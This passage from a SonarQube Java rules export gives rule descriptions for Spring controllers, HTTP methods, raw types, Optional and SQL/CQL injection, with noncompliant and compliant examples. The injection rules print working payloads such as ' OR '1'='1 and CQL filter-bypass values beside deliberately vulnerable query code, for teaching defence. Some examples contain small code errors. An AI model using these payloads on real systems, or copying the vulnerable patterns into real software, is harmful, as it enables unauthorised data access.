{\n  if (!isEligibleForDiscount(user)) {     // +1 ( if )\n    return price;\n  }\n  if (user.hasMembership()) {             // +1\n    return price * 0.9;\n  }\n  if (user.ordersCount() == 1) {          // +1 ( if )\n    return price * 0.95;\n  }\n  return price;\n}\n</pre>\n<h3>Pitfalls</h3>\n<p>As this code is complex, ensure that you have unit tests that cover the code before refactoring.</p>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> Sonar - <a href=\"https://www.sonarsource.com/docs/CognitiveComplexity.pdf\">Cognitive Complexity</a> </li>\n</ul>\n<h3>Articles &amp; blog posts</h3>\n<ul>\n  <li> Sonar Blog - <a href=\"https://www.sonarsource.com/blog/5-clean-code-tips-for-reducing-cognitive-complexity/\">5 Clean Code Tips for Reducing\n  Cognitive Complexity</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":true,"quickfix":"infeasible","ruleKey":"RSPEC-3776","summary":"Cognitive Complexity of methods should not be too high","tags":["architecture","brain-overload"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"FOCUSED","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>A Spring <code>@Controller</code> that uses <code>@SessionAttributes</code> is designed to handle a stateful / multi-post form. Such\n<code>@Controller</code>s use the specified <code>@SessionAttributes</code> to store data on the server between requests. That data should be cleaned\nup when the session is over, but unless <code>setComplete()</code> is called on the <code>SessionStatus</code> object from a\n<code>@RequestMapping</code> method, neither Spring nor the JVM will know itâs time to do that. Note that the <code>SessionStatus</code> object must\nbe passed to that method as a parameter.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Controller\n@SessionAttributes(\"hello\")  // Noncompliant: this doesn't get cleaned up\npublic class HelloWorld {\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    return \"Hello \" + greetee;\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Controller\n@SessionAttributes(\"hello\")\npublic class HelloWorld {\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    return \"Hello \" + greetee;\n  }\n\n  @RequestMapping(\"/goodbye\", method = POST)\n  public String goodbye(SessionStatus status) {\n    //...\n    status.setComplete();\n  }\n\n}\n</pre>\n\n","impacts":[{"name":"reliability","level":"BLOCKER"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3753","summary":"\"@Controller\" classes that use \"@SessionAttributes\" must call \"setComplete\" on their \"SessionStatus\" objects","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<p>An HTTP method is safe when used to perform a read-only operation, such as retrieving information. In contrast, an unsafe HTTP method is used to\nchange the state of an application, for instance to update a userâs profile on a web application.</p>\n<p>Common safe HTTP methods are GET, HEAD, or OPTIONS.</p>\n<p>Common unsafe HTTP methods are POST, PUT and DELETE.</p>\n<p>Allowing both safe and unsafe HTTP methods to perform a specific operation on a web application could impact its security, for example CSRF\nprotections are most of the time only protecting operations performed by unsafe HTTP methods.</p>\n<h2>Ask Yourself Whether</h2>\n<ul>\n  <li> HTTP methods are not defined at all for a route/controller of the application. </li>\n  <li> Safe HTTP methods are defined and used for a route/controller that can change the state of an application. </li>\n</ul>\n<p>There is a risk if you answered yes to any of those questions.</p>\n<h2>Recommended Secure Coding Practices</h2>\n<p>For all the routes/controllers of an application, the authorized HTTP methods should be explicitly defined and safe HTTP methods should only be\nused to perform read-only operations.</p>\n<h2>Sensitive Code Example</h2>\n<pre>\n@RequestMapping(\"/delete_user\")  // Sensitive: by default all HTTP methods are allowed\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = {RequestMethod.GET, RequestMethod.POST}) // Sensitive: both safe and unsafe methods are allowed\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>Compliant Solution</h2>\n<pre>\n@RequestMapping(\"/delete_user\", method = RequestMethod.POST)  // Compliant\npublic String delete1(String username) {\n// state of the application will be changed here\n}\n\n@RequestMapping(path = \"/delete_user\", method = RequestMethod.POST) // Compliant\nString delete2(@RequestParam(\"id\") String id) {\n// state of the application will be changed here\n}\n</pre>\n<h2>See</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A01_2021-Broken_Access_Control/\">Top 10 2021 Category A1 - Broken Access Control</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/Top10/A04_2021-Insecure_Design/\">Top 10 2021 Category A4 - Insecure Design</a> </li>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A5_2017-Broken_Access_Control\">Top 10 2017 Category A5 - Broken Access Control</a>\n  </li>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/352\">CWE-352 - Cross-Site Request Forgery (CSRF)</a> </li>\n  <li> <a href=\"https://owasp.org/www-community/attacks/csrf\">OWASP: Cross-Site Request Forgery</a> </li>\n  <li> <a href=\"https://docs.spring.io/spring-security/site/docs/5.0.x/reference/html/csrf.html#csrf-use-proper-verbs\">Spring Security Official\n  Documentation: Use proper HTTP verbs (CSRF protection)</a> </li>\n</ul>\n\n","impacts":[{"name":"security","level":"LOW"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3752","summary":"Allowing both safe and unsafe HTTP methods is security-sensitive","tags":["cwe","spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Security Hotspot"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>A method with a <code>@RequestMapping</code> annotation part of a class annotated with <code>@Controller</code> (directly or indirectly through a\nmeta annotation - <code>@RestController</code> from Spring Boot is a good example) will be called to handle matching web requests. That will happen\neven if the method is <code>private</code>, because Spring invokes such methods via reflection, without checking visibility.</p>\n<p>So marking a sensitive method <code>private</code> may seem like a good way to control how such code is called. Unfortunately, not all Spring\nframeworks ignore visibility in this way. For instance, if youâve tried to control web access to your sensitive, <code>private</code>,\n<code>@RequestMapping</code> method by marking it <code>@Secured</code> â¦â it will still be called, whether or not the user is authorized to access\nit. Thatâs because AOP proxies are not applied to private methods.</p>\n<p>In addition to <code>@RequestMapping</code>, this rule also considers the annotations introduced in Spring Framework 4.3: <code>@GetMapping</code>,\n<code>@PostMapping</code>, <code>@PutMapping</code>, <code>@DeleteMapping</code>, <code>@PatchMapping</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@RequestMapping(\"/greet\", method = GET)\nprivate String greet(String greetee) {  // Noncompliant\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@RequestMapping(\"/greet\", method = GET)\npublic String greet(String greetee) {\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> OWASP - <a href=\"https://owasp.org/www-project-top-ten/2017/A6_2017-Security_Misconfiguration\">Top 10 2017 Category A6 - Security\n  Misconfiguration</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3751","summary":"\"@RequestMapping\" methods should not be \"private\"","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>Spring <code>@Controller</code>s, <code>@Service</code>s, and <code>@Repository</code>s have <code>singleton</code> scope by default, meaning only\none instance of the class is ever instantiated in the application. Defining any other scope for one of these class types will result in needless churn\nas new instances are created and destroyed. In a busy web application, this could cause a significant amount of needless additional load on the\nserver.</p>\n<p>This rule raises an issue when the <code>@Scope</code> annotation is applied to a <code>@Controller</code>, <code>@Service</code>, or\n<code>@Repository</code> with any value but \"singleton\". <code>@Scope(\"singleton\")</code> is redundant, but ignored.</p>\n<h3>Noncompliant code example</h3>\n<pre>\n@Scope(\"prototype\")  // Noncompliant\n@Controller\npublic class HelloWorld {\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Controller\npublic class HelloWorld {\n</pre>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3750","summary":"Spring \"@Controller\" classes should not use \"@Scope\"","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Bug"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Critical","description":"<h2>Why is this an issue?</h2>\n<p>Spring <code>@Component</code>, <code>@Controller</code>, <code>@RestController</code>,<code>@Service</code>, and <code>@Repository</code> classes\nare singletons by default, meaning only one instance of the class is ever instantiated in the application. Typically such a class might have a few\n<code>static</code> members, such as a logger, but all non-<code>static</code> members should be managed by Spring.</p>\n<p>This rule raises an issue when a singleton <code>@Component</code>, <code>@Controller</code>, <code>@RestController</code>, <code>@Service</code>,\nor <code>@Repository</code>, not annotated with <code>@ConfigurationProperties</code>, has non-<code>static</code> members that are not annotated with\none of:</p>\n<ul>\n  <li> <code>org.springframework.beans.factory.annotation.Autowired</code> </li>\n  <li> <code>org.springframework.beans.factory.annotation.Value</code> </li>\n  <li> <code>javax.annotation.Inject</code> </li>\n  <li> <code>javax.annotation.Resource</code> </li>\n  <li> <code>javax.persistence.PersistenceContext</code> </li>\n  <li> <code>jakarta.annotation.Resource</code> </li>\n  <li> <code>jakarta.inject.Inject</code> </li>\n  <li> <code>jakarta.persistence.PersistenceContext</code> </li>\n</ul>\n<h2>How to fix it</h2>\n<p>Add one of these annotations to all non-<code>static</code> members: <code>@Resource</code>, <code>@Inject</code>, <code>@Autowired</code> or\n<code>@Value</code>.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre>\n@Controller\npublic class HelloWorld {\n\n  private String name = null;\n\n  @RequestMapping(\"/greet\", method = GET)\n  public String greet(String greetee) {\n\n    if (greetee != null) {\n      this.name = greetee;\n    }\n\n    return \"Hello \" + this.name;  // if greetee is null, you see the previous user's data\n  }\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"HIGH"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3749","summary":"Members of Spring components should be injected","tags":["spring"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<p>Generic types should not be used raw (without type arguments). To fix this issue, add the type parameters.</p>\n<h2>Why is this an issue?</h2>\n<p>A generic type is a generic class or interface that is parameterized over types. For example, <code>java.util.List</code> has one type parameter:\nthe type of its elements.</p>\n<p>Using generic types raw (without binding arguments to the type parameters) prevents compile-time type checking for expressions that use these type\nparameters. Explicit type casts are necessary for them, which do perform a runtime type check that may fail with a\n<code>ClassCastException</code>.</p>\n<h3>What is the potential impact?</h3>\n<p>The compiler cannot assert that the program is inherently type safe. When a cast fails, a <code>ClassCastException</code> is thrown during runtime\nand the program most likely crashes. Therefore, this issue might impact the availability and reliability of your application.</p>\n<h3>Exceptions</h3>\n<p>The rule does not raise an issue for the simple <code>instanceof</code> operator, which checks against runtime types where type parameter\ninformation has been erased. Since it does not return a rawly typed instance but a boolean value, it does not prevent compile-time type checking.</p>\n<p>This, however, is not the case for the <code>cast</code> operator as well as the extended <code>instanceof</code> operator which are both not an\nexception from this rule. Since they operate on the erased runtime type as well, they must use wildcard type arguments when checked against a\nparameterized type (see the examples).</p>\n<h2>How to fix it</h2>\n<p>For any usage of parameterized types, bind the type parameters with type arguments. For example, when a function returns a list of strings, the\nreturn type is <code>List&lt;String&gt;</code>, where the type parameter <code>E</code> in interface <code>List&lt;E&gt;</code> is bound with the\nargument <code>String</code>.</p>\n<p>If the concrete binding is unknown, you still should not use the type raw. Use a wildcard type argument instead, with optional lower or upper\nbound, such as in <code>List&lt;?&gt;</code> for a list whose element type is unknown, or <code>List&lt;? extends Number&gt;</code> for a list whose\nelement type is <code>Number</code> or a subtype of it.</p>\n<h3>Code examples</h3>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"noncompliant\">\n// List is supposed to store integers only\nList integers = new ArrayList&lt;&gt;();\n\n// Yet, we can add strings, because we did not give\n// this information to the compiler\nintegers.add(\"Hello World!\");\n\n// Type is checked during runtime and will throw a ClassCastException\nInteger a = (Integer) integers.get(0);\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"1\" data-diff-type=\"compliant\">\n// List is supposed to store integers, and we let the compiler know\nList&lt;Integer&gt; integers = new ArrayList&lt;&gt;();\n\n// Now we can add only integers.\n// Adding a string results in a compile time error.\nintegers.add(42);\n\n// No cast required anymore, and no possible ClassCastException\nInteger a = integers.get(0);\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"noncompliant\">\nString getStringFromForcedList(Object object) {\n  // Cast expression and instanceof can check runtime type only.\n  // The solution is _not_ to skip the type argument in that case.\n  return object instanceof List stringList ? (String) stringList.getFirst(): \"\";\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"2\" data-diff-type=\"compliant\">\nString getStringFromForcedList(Object object) {\n  // The solution is to use a wildcard type argument in that case.\n  return object instanceof List&lt;?&gt; stringList ? (String) stringList.getFirst(): \"\";\n}\n</pre>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"noncompliant\">\nString getStringFromForcedList(Object object) {\n  return object instanceof List stringList ? (String) stringList.getFirst(): \"\";\n}\n\nString returnString() {\n  Object object = List.of(\"Hello\");\n  return getStringFromForcedList(object);\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"3\" data-diff-type=\"compliant\">\nObject getObjectFromForcedList(Object object) {\n  // You may also choose not to make assumptions about type arguments you cannot infer.\n  return object instanceof List&lt;?&gt; list ? list.getFirst(): \"\";\n}\n\nString returnString(Object object) {\n  // Instead, delegate the decision to use-site, which may have more information.\n  Object object = List.of(\"Hello\");\n  return (String) getObjectFromForcedList(object);\n}\n</pre>\n<h2>Resources</h2>\n<h3>Documentation</h3>\n<ul>\n  <li> <a href=\"https://docs.oracle.com/javase/tutorial/java/generics/rawTypes.html\">Raw types</a> in the Java Tutorial. </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3740","summary":"Raw types should not be used","tags":["pitfall"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p>The <code>Files.exists</code> method has noticeably poor performance in JDK 8, and can slow an application significantly when used to check files\nthat donât actually exist.</p>\n<p>The same goes for <code>Files.notExists</code>, <code>Files.isDirectory</code> and <code>Files.isRegularFile</code> from <code>java.nio.file</code>\npackage.</p>\n<p><strong>Note</strong> that this rule is automatically disabled when the projectâs <code>sonar.java.source</code> is not 8.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nPath myPath;\nif(java.nio.file.Files.exists(myPath)) {  // Noncompliant\n // do something\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nPath myPath;\nif(myPath.toFile().exists())) {\n // do something\n}\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> <a href=\"https://bugs.openjdk.java.net/browse/JDK-8153414\">https://bugs.openjdk.java.net/browse/JDK-8153414</a> </li>\n  <li> <a href=\"https://bugs.openjdk.java.net/browse/JDK-8154077\">https://bugs.openjdk.java.net/browse/JDK-8154077</a> </li>\n</ul>\n\n","impacts":[{"name":"maintainability","level":"MEDIUM"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3725","summary":"Java 8's \"Files.exists\" should not be used","tags":["performance","java8"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"EFFICIENT","type":"Code Smell"},{"availability":["sonarlint","sonarqube"],"defaultSeverity":"Info","description":"<h2>Why is this an issue?</h2>\n<p>This rule allows banning certain classes.</p>\n<h3>Noncompliant code example</h3>\n<p>Given parameters:</p>\n<ul>\n  <li> className:java.lang.String </li>\n</ul>\n<pre>\nString name;  // Noncompliant\n</pre>\n\n","impacts":[{"name":"maintainability","level":"INFO"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3688","summary":"Track uses of disallowed classes","tags":[],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CONVENTIONAL","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Minor","description":"<h2>Why is this an issue?</h2>\n<p>When the code under test in a unit test throws an exception, the test itself fails. Therefore, there is no need to surround the tested code with a\n<code>try</code>-<code>catch</code> structure to detect failure. Instead, you can simply move the exception type to the method signature.</p>\n<p>This rule raises an issue when there is a fail assertion inside a <code>catch</code> block.</p>\n<p>Supported frameworks:</p>\n<ul>\n  <li> JUnit3 </li>\n  <li> JUnit4 </li>\n  <li> JUnit5 </li>\n  <li> Fest assert </li>\n  <li> AssertJ </li>\n</ul>\n<h3>Noncompliant code example</h3>\n<pre>\n@Test\npublic void testMethod() {\n  try {\n            // Some code\n  } catch (MyException e) {\n    Assert.fail(e.getMessage());  // Noncompliant\n  }\n}\n</pre>\n<h3>Compliant solution</h3>\n<pre>\n@Test\npublic void testMethod() throws MyException {\n    // Some code\n}\n</pre>\n\n","impacts":[{"name":"maintainability","level":"LOW"}],"inDefaultProfile":false,"quickfix":"unknown","ruleKey":"RSPEC-3658","summary":"Unit tests should throw exceptions","tags":["error-handling","junit","tests","clumsy"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"CLEAR","type":"Code Smell"},{"availability":["sonarcloud","sonarlint","sonarqube"],"defaultSeverity":"Major","description":"<h2>Why is this an issue?</h2>\n<p><code>Optional</code> value can hold either a value or not. The value held in the <code>Optional</code> can be accessed using the\n<code>get()</code> method, but it will throw a</p>\n<p><code>NoSuchElementException</code> if there is no value present. To avoid the exception, calling the <code>isPresent()</code> or <code>!\nisEmpty()</code> method should always be done before any call to <code>get()</code>.</p>\n<p>Alternatively, note that other methods such as <code>orElse(...)</code>, <code>orElseGet(...)</code> or <code>orElseThrow(...)</code> can be used\nto specify what to do with an empty <code>Optional</code>.</p>\n<h3>Noncompliant code example</h3>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nString stringValue = value.get(); // Noncompliant\n</pre>\n<pre>\nif (methodThatReturnsOptional().isEmpty()) {\n  throw new NotFoundException();\n}\nString value = methodThatReturnsOptional().get(); // Noncompliant: indirect access, we consider that two consecutive calls can return different values.\n</pre>\n<h3>Compliant solution</h3>\n<pre>\nthis.getOptionalValue().ifPresent(stringValue -&gt;\n  // Do something with stringValue\n);\n</pre>\n<p>or</p>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nif (value.isPresent()) {\n  String stringValue = value.get();\n}\n</pre>\n<p>or</p>\n<pre>\nOptional&lt;String&gt; value = this.getOptionalValue();\n\n// ...\n\nString stringValue = value.orElse(\"default\");\n</pre>\n<pre>\nOptional&lt;String&gt; optional = methodThatReturnsOptional();\nif (optional.isEmpty()) {\n  throw new NotFoundException();\n}\nString value = optional.get();\n</pre>\n<h2>Resources</h2>\n<ul>\n  <li> CWE - <a href=\"https://cwe.mitre.org/data/definitions/476\">CWE-476 - NULL Pointer Dereference</a> </li>\n</ul>\n\n","impacts":[{"name":"reliability","level":"MEDIUM"}],"inDefaultProfile":true,"quickfix":"unknown","ruleKey":"RSPEC-3655","summary":"Optional value should only be accessed after calling isPresent()","tags":["cwe","symbolic-execution"],"versions":{"serverEdition":"Developer","serverVersion":"9.1.0.47736","communityVersion":"9.1.0.47736"},"cleanCodeAttribute":"COMPLETE","type":"Bug"},{"availability":["sonarcloud","sonarqube"],"defaultSeverity":"Blocker","description":"<h2>Why is this an issue?</h2>\n<p>Database injections (such as SQL injections) occur in an application when the application retrieves data from a user or a third-party service and\ninserts it into a database query without sanitizing it first.</p>\n<p>If an application contains a database query that is vulnerable to injections, it is exposed to attacks that target any database where that query is\nused.</p>\n<p>A user with malicious intent is able to modify the existing query to change its logic to a malicious one.</p>\n<p>After creating the malicious request, the attacker can attack the databases affected by this vulnerability without relying on any\npre-requisites.</p>\n<h3>What is the potential impact?</h3>\n<p>In the context of a web application that is vulnerable to SQL injection:<br> After discovering the injection, attackers inject data into the\nvulnerable field to execute malicious commands in the affected databases.</p>\n<p>Below are some real-world scenarios that illustrate some impacts of an attacker exploiting the vulnerability.</p>\n<h4>Identity spoofing and data manipulation</h4>\n<p>A malicious database query enables privilege escalation or direct data leakage from one or more databases. This threat is the most widespread\nimpact.</p>\n<h4>Data deletion and denial of service</h4>\n<p>The malicious query makes it possible for the attacker to delete data in the affected databases.<br> This threat is particularly insidious if the\nattacked organization does not maintain a disaster recovery plan (DRP).</p>\n<h4>Chaining DB injections with other vulnerabilities</h4>\n<p>Attackers who exploit SQL injections rely on other vulnerabilities to maximize their profits.<br> Most of the time, organizations overlook some\ndefense in depth measures because they assume attackers cannot reach certain points in the infrastructure. This misbehavior can lead to multiple\nattacks with great impact:</p>\n<ul>\n  <li> When secrets are stored unencrypted in databases: Secrets can be exfiltrated and lead to compromise of other components. </li>\n  <li> If server-side OS and/or database permissions are misconfigured, injection can lead to remote code execution (RCE).\n    <ul>\n      <li> See <a href=\"https://blog.sonarsource.com/exploiting-hibernate-injections/\">our article on this topic</a> </li>\n    </ul>  </li>\n</ul>\n<h2>How to fix it in Spring Data Cassandra</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of a simple API endpoint designed to read public messages. It is vulnerable to CQL injection because\nuser-controlled data is inserted directly into a query string. The application assumes that incoming data always has a specific range of characters\nand ignores that some characters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following values:</p>\n<ul>\n  <li> <code>user=foo'/*</code> </li>\n  <li> <code>date=*/AND date = 'xxxx-yy-zz</code> </li>\n</ul>\n<p>By adapting and inserting these values, an attacker can bypass the <code>private = false</code> condition and get access to private messages.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"22\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    CqlSession cqlSession;\n\n    @GetMapping(value = \"/read\")\n    @ResponseBody\n    public List&lt;String&gt; readPublicOnly(\n            @RequestParam(\"user\") String user,\n            @RequestParam(\"date\") String date)\n    {\n        String query = \"SELECT content FROM app.message WHERE user = '\" + user + \"' AND private = false AND date = '\"+ date +\"'\";\n\n        CqlOperations template = new CqlTemplate(cqlSession);\n        return template.queryForList(query, String.class); //Noncompliant\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"22\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    CqlSession cqlSession;\n\n    @GetMapping(value = \"/read\")\n    @ResponseBody\n    public List&lt;String&gt; readPublicOnly(\n            @RequestParam(\"user\") String user,\n            @RequestParam(\"date\") String date)\n    {\n        String query = \"SELECT content FROM app.message WHERE user = ? AND private = false AND date = ?\";\n\n        CqlOperations template = new CqlTemplate(cqlSession);\n        LocalDate filterDate = LocalDate.parse(date);\n        return template.queryForList(query, String.class, user, filterDate);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>How to fix it in Java JDBC API</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple data retrieval function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\n' OR '1'='1\n</pre>\n<p>Using the UNION clause, an attacker would also be able to perform queries against other tables and combine the returned data within the same query\nresult.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    Connection connection;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass) throws SQLException\n    {\n        String query = \"SELECT * FROM users WHERE user = '\" + user + \"' AND pass = '\" + pass + \"'\";\n\n        try (Statement statement = connection.createStatement()) {\n\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (!resultSet.next()) {\n                return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n            }\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h4>Compliant solution</h4>\n<pre data-diff-id=\"11\" data-diff-type=\"compliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    Connection connection;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass) throws SQLException\n    {\n        String query = \"SELECT * FROM users WHERE user = ? AND pass = ?\";\n\n        try (PreparedStatement statement = connection.prepareStatement(query)) {\n            statement.setString(1, user);\n            statement.setString(2, pass);\n\n            ResultSet resultSet = statement.executeQuery(query);\n\n            if (!resultSet.next()) {\n                return new ResponseEntity&lt;&gt;(\"Unauthorized\", HttpStatus.UNAUTHORIZED);\n            }\n        }\n\n        return new ResponseEntity&lt;&gt;(\"Authentication Success\", HttpStatus.OK);\n    }\n}\n</pre>\n<h3>How does this work?</h3>\n<h4>Use prepared statements</h4>\n<p>As a rule of thumb, the best approach to protect against injections is to systematically ensure that untrusted data cannot break out of an\ninterpreted context.</p>\n<p>For database queries, prepared statements are a natural mechanism to achieve this due to their internal workings.<br> Here is an example with the\nfollowing query string (Java SE syntax):</p>\n<pre>\nSELECT * FROM users WHERE user = ? AND pass = ?\n</pre>\n<p><strong>Note: Placeholders may take different forms, depending on the library used. For the above example, the question mark symbol '?' was used as\na placeholder.</strong></p>\n<p>When a prepared statement is used by an application, the database server compiles the query logic even before the application passes the literals\ncorresponding to the placeholders to the database.<br> Some libraries expose a <code>prepareStatement</code> function that explicitly does so, and\nsome do not - because they do it transparently.</p>\n<p>The compiled code that contains the query logic also includes the placeholders: they serve as parameters.</p>\n<p>After compilation, the query logic is frozen and cannot be changed.<br> So when the application passes the literals that replace the placeholders,\nthey are not considered application logic by the database.</p>\n<p>Consequently, the database server prevents the dynamic literals of a prepared statement from affecting the underlying query, and thus sanitizes\nthem.</p>\n<p>On the other hand, the application does not automatically sanitize third-party data (for example, user-controlled data) inserted directly into a\nquery. An attacker who controls this third-party data can cause the database to execute malicious code.</p>\n<h2>How to fix it in Spring</h2>\n<h3>Code examples</h3>\n<p>The following code is an example of an overly simple data retrieval function. It is vulnerable to SQL injection because user-controlled data is\ninserted directly into a query string: The application assumes that incoming data always has a specific range of characters and ignores that some\ncharacters may change the query logic to a malicious one.</p>\n<p>In this particular case, the query can be exploited with the following string:</p>\n<pre>\n' OR '1'='1\n</pre>\n<p>Using the UNION clause, an attacker would also be able to perform queries against other tables and combine the returned data within the same query\nresult.</p>\n<h4>Noncompliant code example</h4>\n<pre data-diff-id=\"21\" data-diff-type=\"noncompliant\">\n@RestController\npublic class ApiController\n{\n    @Autowired\n    JdbcTemplate jdbcTemplate;\n\n    @GetMapping(value = \"/authenticate\")\n    @ResponseBody\n    public ResponseEntity&lt;String&gt; authenticate(\n        @RequestParam(\"user\") String user,\n        @RequestParam(\"pass\") String pass)\n    {\n        String query = \"SELECT * FROM users WHERE user = '\" + user + \"' AND pass = '\" + pass + \"'\";\n\n        try {\n            